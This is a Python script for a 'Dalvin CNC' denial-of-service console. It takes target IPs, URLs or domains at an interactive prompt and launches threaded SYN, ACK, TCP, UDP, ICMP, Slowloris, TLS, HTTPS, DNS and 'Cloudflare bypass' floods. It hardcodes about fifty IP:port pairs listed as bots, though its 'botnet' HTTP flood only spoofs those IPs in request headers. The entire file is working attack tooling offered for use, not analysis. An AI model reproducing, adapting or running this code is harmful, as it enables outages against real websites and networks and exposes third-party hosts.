import os
import sys
import threading
import requests
import socket
import random
import time
import ssl
import struct
import json
import re
from urllib.parse import urlparse
from bs4 import BeautifulSoup
from colorama import Fore, Style, init

init(autoreset=True)
B, W, R, G, Y = Fore.BLUE, Fore.WHITE, Fore.RED, Fore.GREEN, Fore.YELLOW
RS = Style.RESET_ALL

active_attacks = {
    'syn': False,
    'ack': False, 
    'slowloris': False,
    'http': False,
    'tcp': False,
    'udp': False,
    'tls': False,
    'httpsbypass': False,
    'icmp': False,
    'cfbypass': False,
    'cfdns': False
}

attack_threads = []

DALVIN_BOTS = list(set([
    "88.129.182.53:8080", "194.71.159.17:80", "93.87.72.254:8090",
    "91.195.155.180:80", "162.218.153.210:8190", "74.113.182.246:9600",
    "109.233.191.130:8080", "109.206.96.98:8080", "109.228.134.144:81",
    "87.116.152.189:80", "117.3.67.76:8081", "109.206.96.75:8080",
    "194.71.159.8:80", "185.36.240.161:80", "219.111.32.218:8088",
    "113.161.217.136:1025", "109.247.68.134:81", "91.102.231.82:8000",
    "88.129.182.53:8083", "109.206.96.230:8080", "121.1.179.87:50001",
    "109.206.96.127:8080", "93.87.72.254:8082", "93.87.72.254:8084",
    "80.245.224.153:80", "109.206.96.96:8080", "188.123.114.79:8008",
    "74.142.49.38:8001", "78.79.196.15:82", "194.237.150.19:80",
    "81.8.160.235:80", "2.229.43.7:9005", "194.237.255.178:81",
    "180.43.97.69:8080", "142.165.244.145:8084", "81.228.44.82:5000",
    "121.117.163.103:8000", "218.42.253.97:80", "218.219.195.166:8083",
    "82.99.75.135:80", "50.196.159.227:53060", "24.129.178.50:46",
    "109.206.96.58:8080", "100.42.92.26:80", "50.244.81.10:80",
    "99.114.240.169:8080",
    "109.206.96.249:8080",
    "75.149.26.30:1024",
    "46.19.234.136:80",
    "193.214.75.118:80"
]))

SECRET_KEY = "DALVIN_XP_KEY"
LISTEN_PORT = 8080

def syn_flood(target, port):
    active_attacks['syn'] = True
    print(f"{Y}[*] Starting INFINITE SYN Flood on {target}:{port}{RS}")
    while active_attacks['syn']:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1)
            s.connect_ex((target, int(port)))
            s.close()
        except:
            pass

def ack_flood(target, port):
    active_attacks['ack'] = True
    print(f"{Y}[*] Starting INFINITE ACK Flood on {target}:{port}{RS}")
    while active_attacks['ack']:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(b'X'*1024, (target, int(port)))
            s.close()
        except:
            pass

def slowloris(target, port):
    active_attacks['slowloris'] = True
    print(f"{Y}[*] Starting INFINITE Slowloris on {target}:{port}{RS}")
    while active_attacks['slowloris']:
        sockets_list = []
        try:
            for _ in range(200):
                if not active_attacks['slowloris']:
                    break
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(4)
                    s.connect((target, int(port)))
                    s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                    s.send(f"Host: {target}\r\n".encode())
                    s.send("User-Agent: Mozilla/5.0\r\n".encode())
                    s.send("Accept: */*\r\n".encode())
                    sockets_list.append(s)
                except:
                    pass
            while active_attacks['slowloris']:
                for s in sockets_list:
                    try:
                        s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                    except:
                        pass
                    time.sleep(15)
        finally:
            for s in sockets_list:
                try:
                    s.close()
                except:
                    pass

def http_flood_botnet(target_url, port):
    active_attacks['http'] = True
    print(f"{Y}[*] Starting  Attack {RS}")
    print(f"{G}[+] Target: {target_url}:{port} | Mode: INFINITE{RS}")
    print(f"{G}[+] Dispatch to {len(DALVIN_BOTS)} bots...{RS}")
    parsed_url = urlparse(target_url)
    target_host = parsed_url.netloc.split(':')[0] if ':' in parsed_url.netloc else parsed_url.netloc
    scheme = parsed_url.scheme if parsed_url.scheme else 'http'
    attack_url = f"{scheme}://{target_host}:{port}{parsed_url.path or '/'}"
    for bot in DALVIN_BOTS:
        t = threading.Thread(target=bot_http_worker, args=(bot, attack_url), daemon=True)
        t.start()
        attack_threads.append(t)
    print(f"{G}[✓]  HTTP Flood activated{RS}")

def bot_http_worker(bot_info, attack_url):
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
        'DalvinBot/1.0'
    ]
    headers_template = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Cache-Control': 'no-cache',
        'Upgrade-Insecure-Requests': '1'
    }
    bot_ip = bot_info.split(':')[0]
    while active_attacks['http']:
        try:
            headers = headers_template.copy()
            headers['User-Agent'] = random.choice(user_agents)
            headers['X-Forwarded-For'] = bot_ip
            headers['X-Real-IP'] = bot_ip
            headers['Referer'] = f"http://{bot_ip}/"
            requests.get(attack_url, headers=headers, timeout=2, verify=False, allow_redirects=True)
        except:
            pass

def packet_flood(method, target, port):
    if method.upper() == "TCP":
        active_attacks['tcp'] = True
    elif method.upper() == "UDP":
        active_attacks['udp'] = True

    print(f"{Y}[*] Starting  {method} FLOOD on {target}:{port}{RS}")

    def flood_worker(worker_id):
        packet_count = 0
        packet_data = random._urandom(65507)

        if method.upper() == "TCP":
            while active_attacks['tcp']:
                try:
                    for _ in range(50):
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                        s.settimeout(0.01)
                        try:
                            s.connect((target, int(port)))
                            s.send(packet_data)
                            packet_count += 1
                        except:
                            pass
                        s.close()
                except:
                    pass
        elif method.upper() == "UDP":
            while active_attacks['udp']:
                try:
                    for _ in range(50):
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                        s.sendto(packet_data, (target, int(port)))
                        s.close()
                        packet_count += 1
                except:
                    pass

        print(f"{G}[✓] Worker {worker_id}: Sent {packet_count} packets{RS}")

    workers = []
    for i in range(1000):
        worker = threading.Thread(target=flood_worker, args=(i+1,), daemon=True)
        worker.start()
        workers.append(worker)
        attack_threads.append(worker)

def tls_handshake_flood(target, port):
    active_attacks['tls'] = True
    print(f"{Y}[*] Starting  TLS Handshake Flood on {target}:{port}{RS}")
    while active_attacks['tls']:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            ssl_sock = context.wrap_socket(sock, server_hostname=target)
            ssl_sock.connect((target, int(port)))
            time.sleep(0.1)
            ssl_sock.close()
        except:
            pass

def https_bypass_flood(target_url):
    active_attacks['httpsbypass'] = True
    print(f"{Y}[*] Starting  HTTPS Bypass Flood on {target_url}{RS}")
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': '*/*',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
    }
    while active_attacks['httpsbypass']:
        try:
            response = requests.get(
                target_url,
                headers=headers,
                verify=False,
                timeout=3,
                allow_redirects=True
            )
        except:
            pass

def icmp_flood(target):
    active_attacks['icmp'] = True
    print(f"{Y}[*] Starting  ICMP Flood on {target}{RS}")
    def create_icmp_packet():
        icmp_type = 8
        icmp_code = 0
        icmp_checksum = 0
        icmp_id = random.randint(0, 0xFFFF)
        icmp_seq = random.randint(0, 0xFFFF)
        icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
        data = random._urandom(1400)
        icmp_checksum = socket.htons(0xFFFF - (sum(icmp_header + data) & 0xFFFF))
        icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
        return icmp_header + data

    while active_attacks['icmp']:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            for _ in range(50):
                packet = create_icmp_packet()
                sock.sendto(packet, (target, 0))
            sock.close()
        except PermissionError:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                packet = random._urandom(65500)
                sock.sendto(packet, (target, 1))
                sock.close()
            except:
                pass
        except:
            pass
        time.sleep(0.01)

def cloudflare_bypass_flood(target_url):
    active_attacks['cfbypass'] = True
    print(f"{Y}[*] Starting  Cloudflare Bypass Flood on {target_url}{RS}")
    cf_bypass_headers = [
        {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0'
        },
        {
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'X-Requested-With': 'XMLHttpRequest'
        },
        {
            'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'From': 'googlebot(at)googlebot.com'
        },
        {
            'User-Agent': 'curl/8.0.1',
            'Accept': '*/*',
            'Connection': 'keep-alive'
        }
    ]
    referers = [
        'https://www.google.com/',
        'https://www.bing.com/',
        'https://www.facebook.com/',
        'https://twitter.com/',
        'https://www.reddit.com/',
        target_url,
        ''
    ]
    def attack_worker(worker_id):
        request_count = 0
        while active_attacks['cfbypass']:
            try:
                technique = random.randint(1, 4)
                if technique == 1:
                    headers = random.choice(cf_bypass_headers)
                    headers['Referer'] = random.choice(referers)
                    headers['X-Forwarded-For'] = f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
                    headers['X-Real-IP'] = headers['X-Forwarded-For']
                    resp = requests.get(
                        target_url,
                        headers=headers,
                        timeout=3,
                        verify=False,
                        allow_redirects=True
                    )
                    request_count += 1
                elif technique == 2:
                    headers = random.choice(cf_bypass_headers)
                    fake_data = {
                        'q': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=20)),
                        'search': ''.join(random.choices('0123456789', k=10)),
                        'token': ''.join(random.choices('abcdef0123456789', k=32))
                    }
                    resp = requests.post(
                        target_url,
                        data=fake_data,
                        headers=headers,
                        timeout=3,
                        verify=False
                    )
                    request_count += 1
                elif technique == 3:
                    headers = random.choice(cf_bypass_headers)
                    subdirs = ['/wp-admin/', '/api/', '/static/', '/assets/', '/images/', 
                              '/css/', '/js/', '/admin/', '/login/', '/api/v1/']
                    attack_url = target_url.rstrip('/') + random.choice(subdirs)
                    resp = requests.get(
                        attack_url,
                        headers=headers,
                        timeout=3,
                        verify=False
                    )
                    request_count += 1
                elif technique == 4:
                    headers = random.choice(cf_bypass_headers)
                    params = {
                        'id': random.randint(1000, 9999),
                        'page': random.randint(1, 100),
                        'cache': random.choice(['true', 'false', '1', '0']),
                        'nocache': str(random.random()),
                        'timestamp': str(int(time.time()))
                    }
                    resp = requests.get(
                        target_url,
                        params=params,
                        headers=headers,
                        timeout=3,
                        verify=False
                    )
                    request_count += 1
                if random.random() > 0.7:
                    time.sleep(random.uniform(0.1, 0.5))
            except:
                pass
    workers = []
    for i in range(10):
        worker = threading.Thread(target=attack_worker, args=(i+1,), daemon=True)
        worker.start()
        workers.append(worker)
        attack_threads.append(worker)
        time.sleep(0.1)

def cloudflare_dns_flood(target_domain):
    active_attacks['cfdns'] = True
    print(f"{Y}[*] Starting  DNS Resolution Flood on {target_domain}{RS}")
    subdomains = [
        'www', 'mail', 'ftp', 'smtp', 'pop', 'imap', 'admin', 'blog',
        'news', 'api', 'secure', 'members', 'support', 'shop', 'store',
        'cdn', 'static', 'assets', 'media', 'images', 'files', 'download',
        'video', 'music', 'forum', 'community', 'wiki', 'status', 'dev',
        'stage', 'test', 'beta', 'alpha', 'ns1', 'ns2', 'mx1', 'mx2'
    ]
    while active_attacks['cfdns']:
        try:
            subdomain = random.choice(subdomains)
            target = f"{subdomain}.{target_domain}"
            socket.gethostbyname(target)
        except:
            pass
        try:
            socket.gethostbyname(target_domain)
        except:
            pass
        time.sleep(0.01)

def check_bots():
    print(f"{Y}[*] Check Bots{RS}")
    online = 0
    for bot in DALVIN_BOTS:
        try:
            ip, port = bot.split(':')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            if s.connect_ex((ip, int(port))) == 0:
                online += 1
                print(f"{G}[+] {ip}:{port} --> ACTIVE{RS}")
            s.close()
        except:
            pass
    print(f"{G}[!] Total Active Nodes Ready: {online}{RS}")

def stop_all_attacks():
    for attack_type in active_attacks:
        active_attacks[attack_type] = False
    time.sleep(1)
    print(f"{G}[✓] All attacks stopped{RS}")

def stop_attack(attack_type):
    if attack_type in active_attacks:
        active_attacks[attack_type] = False
        print(f"{G}[✓] {attack_type.upper()} attack stopped{RS}")
    else:
        print(f"{R}[!] Unknown attack type{RS}")

def list_attacks():
    print(f"{Y}[*] Active Attacks:{RS}")
    for attack, status in active_attacks.items():
        if status:
            print(f"{G}  {attack.upper()}: ACTIVE{RS}")
        else:
            print(f"{R}  {attack.upper()}: INACTIVE{RS}")

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"{B}    ____  ___    __ _    _______   __")
    print(f"{B}   / __ \/   |  / /| |  / /  _/ | / /")
    print(f"{B}  / / / / /| | / / | | / // //  |/ / ")
    print(f"{B} / /_/ / ___ |/ /__| |/ // // /|  /  ")
    print(f"{B}/_____/_/  |_/_____|___/___/_/ |_/   ")
    print(f"{W}   [DALVIN CNC NODES: {G}{len(DALVIN_BOTS)}{W}]             ")

def main():
    banner()
    while True:
        try:
            cmd_input = input(f"\n{B}Dalvin@CNC:~# {RS}").strip()
            cmd = cmd_input.split()
            if not cmd:
                continue
            if cmd[0].lower() == "check":
                check_bots()
                continue
            if cmd[0].lower() == "clear":
                banner()
                continue
            if cmd[0].lower() == "exit":
                stop_all_attacks()
                break
            if cmd[0].lower() == "help":
                print(f"{Y}Available Commands:{RS}")
                print(f"  {G}check{Y} - Check botnet")
                print(f"  {G}clear{Y} - Clear screen")
                print(f"  {G}exit{Y} - Exit program")
                print(f"  {G}stop all{Y} - Stop all attacks")
                print(f"  {G}stop <type>{Y} - Stop specific attack")
                print(f"  {G}list attacks{Y} - Show active attacks")
                print(f"  {G}syn <IP> <PORT>{R}")
                print(f"  {G}ack <IP> <PORT>{R}")
                print(f"  {G}slowloris <IP> <PORT>{R}")
                print(f"  {G}http <URL> <PORT>{R}")
                print(f"  {G}tcp <IP> <PORT>{R}")
                print(f"  {G}udp <IP> <PORT>{R}")
                print(f"  {G}tls <IP> <PORT>{R}")
                print(f"  {G}httpsbypass <URL>{R}")
                print(f"  {G}icmp <IP>{R}")
                print(f"  {G}cfbypass <URL>{R}")
                print(f"  {G}cfdns <DOMAIN>{R}")
                continue
            if cmd[0].lower() == "stop":
                if len(cmd) == 2:
                    if cmd[1].lower() == "all":
                        stop_all_attacks()
                    else:
                        stop_attack(cmd[1].lower())
                else:
                    print(f"{R}Usage: stop all  stop <attack_type>{RS}")
                continue
            if cmd[0].lower() == "list":
                if len(cmd) == 2 and cmd[1].lower() == "attacks":
                    list_attacks()
                continue
            if cmd[0].lower() == "syn":
                if len(cmd) == 3:
                    t = threading.Thread(target=syn_flood, args=(cmd[1], cmd[2]), daemon=True)
                    t.start()
                    attack_threads.append(t)
                    print(f"{G}[+]  SYN Flood started on {cmd[1]}:{cmd[2]}!{RS}")
                else:
                    print(f"{R}Usage: syn <IP> <PORT>{RS}")
                continue
            if cmd[0].lower() == "ack":
                if len(cmd) == 3:
                    t = threading.Thread(target=ack_flood, args=(cmd[1], cmd[2]), daemon=True)
                    t.start()
                    attack_threads.append(t)
                    print(f"{G}[+]  ACK Flood started on {cmd[1]}:{cmd[2]}!{RS}")
                else:
                    print(f"{R}Usage: ack <IP> <PORT>{RS}")
                continue
            if cmd[0].lower() == "slowloris":
                if len(cmd) == 3:
                    t = threading.Thread(target=slowloris, args=(cmd[1], cmd[2]), daemon=True)
                    t.start()
                    attack_threads.append(t)
                    print(f"{G}[+]  Slowloris started on {cmd[1]}:{cmd[2]}!{RS}")
                else:
                    print(f"{R}Usage: slowloris <IP> <PORT>{RS}")
                continue
            if cmd[0].lower() == "http":
                if len(cmd) == 3:
                    http_flood_botnet(cmd[1], cmd[2])
                else:
                    print(f"{R}Usage: http <URL> <PORT>{RS}")
                continue
            if cmd[0].lower() == "tls":
                if len(cmd) == 3:
                    t = threading.Thread(target=tls_handshake_flood, args=(cmd[1], cmd[2]), daemon=True)
                    t.start()
                    attack_threads.append(t)
                    print(f"{G}[+]  TLS Flood started on {cmd[1]}:{cmd[2]}!{RS}")
                else:
                    print(f"{R}Usage: tls <IP> <PORT>{RS}")
                continue
            if cmd[0].lower() == "httpsbypass":
                if len(cmd) == 2:
                    t = threading.Thread(target=https_bypass_flood, args=(cmd[1],), daemon=True)
                    t.start()
                    attack_threads.append(t)
                    print(f"{G}[+]  HTTPS Bypass Flood started on {cmd[1]}!{RS}")
                else:
                    print(f"{R}Usage: httpsbypass <URL>{RS}")
                continue
            if cmd[0].lower() == "icmp":
                if len(cmd) == 2:
                    t = threading.Thread(target=icmp_flood, args=(cmd[1],), daemon=True)
                    t.start()
                    attack_threads.append(t)
                    print(f"{G}[+]  ICMP Flood started on {cmd[1]}!{RS}")
                else:
                    print(f"{R}Usage: icmp <IP>{RS}")
                continue
            if cmd[0].lower() == "cfbypass":
                if len(cmd) == 2:
                    cloudflare_bypass_flood(cmd[1])
                    print(f"{G}[+]  Cloudflare Bypass Flood started on {cmd[1]}!{RS}")
                else:
                    print(f"{R}Usage: cfbypass <URL>{RS}")
                continue
            if cmd[0].lower() == "cfdns":
                if len(cmd) == 2:
                    t = threading.Thread(target=cloudflare_dns_flood, args=(cmd[1],), daemon=True)
                    t.start()
                    attack_threads.append(t)
                    print(f"{G}[+]  DNS Flood started on {cmd[1]}!{RS}")
                else:
                    print(f"{R}Usage: cfdns <DOMAIN>{RS}")
                continue
            if cmd[0].upper() in ["TCP", "UDP"]:
                if len(cmd) == 3:
                    packet_flood(cmd[0], cmd[1], cmd[2])
                    print(f"{G}[+]  {cmd[0]} Flood started on {cmd[1]}:{cmd[2]}!{RS}")
                else:
                    print(f"{R}Usage: tcp/udp <IP> <PORT>{RS}")
                continue
            print(f"{R}[!] Unknown command{RS}")
        except KeyboardInterrupt:
            print(f"\n{R}[!] Interrupted{RS}")
            break
        except Exception as e:
            print(f"{R}[!] Error: {e}{RS}")

if __name__ == "__main__":
    main()